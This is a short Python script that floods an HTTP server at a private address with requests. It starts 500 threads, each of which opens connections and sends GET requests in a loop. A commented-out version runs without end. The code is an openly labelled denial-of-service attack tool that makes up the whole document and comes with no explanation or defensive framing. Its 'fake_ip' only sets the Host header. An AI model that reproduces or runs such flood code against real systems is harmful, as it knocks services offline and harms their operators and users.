import socket
import threading
import time

target = '10.0.0.69'
fake_ip = '182.21.20.32'
port = 8000
attack_num = 1
start = time.perf_counter()
def attack():
    while time.perf_counter() - start < 10:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + 'ping' + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

# def attack():
#     while True:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect((target, port))
#         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
#         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
#         s.close()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

